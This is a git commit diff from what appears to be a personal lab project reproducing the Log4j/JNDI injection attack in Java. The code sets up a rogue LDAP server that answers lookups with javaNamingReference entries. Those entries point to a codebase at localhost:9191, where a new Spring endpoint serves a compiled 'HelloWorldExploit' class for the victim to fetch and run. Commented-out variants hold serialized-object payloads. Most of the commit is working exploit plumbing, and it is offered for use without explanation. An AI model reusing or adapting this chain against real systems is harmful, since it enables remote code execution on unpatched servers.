e9f444192c118719f7ca236a6bf837aa77e539d5
Sergei Basharkin <Basharkin@lanit.ru>
2024-10-15 18:49:07 +0300

    test

--- src/main/java/com/example/log4jtest/LdapServer.java
+++ src/main/java/com/example/log4jtest/LdapServer.java
@@ -13,15 +13,39 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.time.LocalDateTime;
 import java.util.Base64;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
+import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;
 
 public class LdapServer {
 
   public static void main(String[] args) throws IOException {
+//    try {
+//      // URL к JAR-файлу, содержащему класс
+//      URL jarUrl = new URL("http://localhost:9191/test");
+//
+//      // Создаем URLClassLoader с URL JAR-файла
+//      try (URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{jarUrl},
+//          TomcatEmbeddedWebappClassLoader.class.getClassLoader())) {
+//        // Полное имя класса, который нужно загрузить
+//        String className = "com.example.log4jtest.HelloWorldExploit";
+//
+//        // Загружаем класс
+//        Class<?> loadedClass = urlClassLoader.loadClass(className);
+//
+//        // Создаем экземпляр загруженного класса
+//        Object instance = loadedClass.getDeclaredConstructor().newInstance();
+//      }
+//    } catch (Exception e) {
+//      e.printStackTrace();
+//    }
+
 
     try {
       InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=Test");
@@ -40,17 +64,6 @@ public class LdapServer {
           LocalDateTime.now() + " [LDAPSERVER] >> Listening on 0.0.0.0:" + port); //$NON-NLS-1$
       ds.startListening();
 
-//      Hashtable<String, String> env = new Hashtable<>();
-//      env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
-//      env.put(Context.PROVIDER_URL, "ldap://localhost:" + port + "/dc=Test");
-//      DirContext ctx = new InitialDirContext(env);
-//
-//      // Добавление записи с HelloWorldExploit в директорию
-//      Attributes attrs = new BasicAttributes(true);
-//      attrs.put("objectClass", "javaNamingReference");
-//      attrs.put("javaClassName", "HelloWorldExploit");
-//      attrs.put("javaFactory", "HelloWorldExploit");
-//      ctx.bind("cn=javaNamingReference", null, attrs);
 
     } catch (Exception e) {
       e.printStackTrace();
@@ -59,29 +72,61 @@ public class LdapServer {
 
   public static class OperationInterceptor extends InMemoryOperationInterceptor {
 
+    private URL codebase = new URL("http://localhost:9191/test");
+
+    public OperationInterceptor() throws MalformedURLException {
+    }
 
     @Override
-    public void processSearchResult(InMemoryInterceptedSearchResult result) {
-      Entry e = new Entry("");
-
-      HelloWorldExploit helloWorldExploit = new HelloWorldExploit();
-      ByteArrayOutputStream bos = new ByteArrayOutputStream();
-      try (ObjectOutputStream o = new ObjectOutputStream(bos);) {
-        o.writeObject(helloWorldExploit);
-      } catch (IOException ex) {
-        throw new RuntimeException(ex);
-      }
-      e.addAttribute("javaClassName", "HelloWorldExploit");
-      e.addAttribute("javaCodeBase", "http://127.0.0.1:9191/HelloWorldExploit.jar");
-      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-      e.addAttribute("javaSerializedData", bos.toByteArray()); //$NON-NLS-1$
-//      e.addAttribute("javaSerializedData", "��\u0000\u0005sr\u0000'com.example.log4jtest.HelloWorldExploit(dl'\\N؞\u0002\u0000\u0000xp"); //$NON-NLS-1$
+    public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+      String base = result.getRequest().getBaseDN();
+      Entry e = new Entry(base);
       try {
-        result.sendSearchEntry(e);
-        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
-      } catch (LDAPException ex) {
-        throw new RuntimeException(ex);
+        sendResult(result, base, e);
+      }
+      catch ( Exception e1 ) {
+        e1.printStackTrace();
       }
     }
+
+    protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
+//      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
+      System.out.println("Send LDAP reference result for " + base + " redirecting to " + codebase);
+      e.addAttribute("javaClassName", "foo");
+      String cbstring = this.codebase.toString();
+      int refPos = cbstring.indexOf('#');
+      if ( refPos > 0 ) {
+        cbstring = cbstring.substring(0, refPos);
+      }
+      e.addAttribute("javaCodeBase", "http://localhost:9191/");
+      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+      e.addAttribute("javaFactory", "HelloWorldExploit");
+      result.sendSearchEntry(e);
+      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+    }
+
+//    @Override
+//    public void processSearchResult(InMemoryInterceptedSearchResult result) {
+//      Entry e = new Entry("");
+//
+//      HelloWorldExploit helloWorldExploit = new HelloWorldExploit();
+//      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+//      try (ObjectOutputStream o = new ObjectOutputStream(bos);) {
+//        o.writeObject(helloWorldExploit);
+//      } catch (IOException ex) {
+//        throw new RuntimeException(ex);
+//      }
+//      e.addAttribute("javaClassName", "com.example.log4jtest.HelloWorldExploit");
+//      e.addAttribute("javaCodeBase", "http://localhost:9191/test");
+//      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+//      e.addAttribute("javaSerializedData", bos.toByteArray()); //$NON-NLS-1$
+////      e.addAttribute("javaSerializedData", "��\u0000\u0005sr\u0000'com.example.log4jtest.HelloWorldExploit(dl'\\N؞\u0002\u0000\u0000xp"); //$NON-NLS-1$
+//      try {
+//        result.sendSearchEntry(e);
+//        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+//      } catch (LDAPException ex) {
+//        throw new RuntimeException(ex);
+//      }
+//    }
   }
 }
--- src/main/java/com/example/log4jtest/Log4jtestApplication.java
+++ src/main/java/com/example/log4jtest/Log4jtestApplication.java
@@ -1,12 +1,15 @@
 package com.example.log4jtest;
 
+import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.nio.file.Files;
 import java.util.Hashtable;
 import javax.naming.Context;
 import javax.naming.InitialContext;
 import javax.naming.NamingException;
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.util.ResourceUtils;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
@@ -19,6 +22,11 @@ public class Log4jtestApplication {
     SpringApplication.run(Log4jtestApplication.class, args);
 
 
+  }
+
+  @GetMapping("/test")
+  public byte[] getCodeBase() throws IOException {
+    return Files.readAllBytes(ResourceUtils.getFile("classpath:static/HelloWorldExploit.class").toPath());
   }
   @GetMapping("/ldap")
   public String handleLdapRequest(@RequestParam String name) {
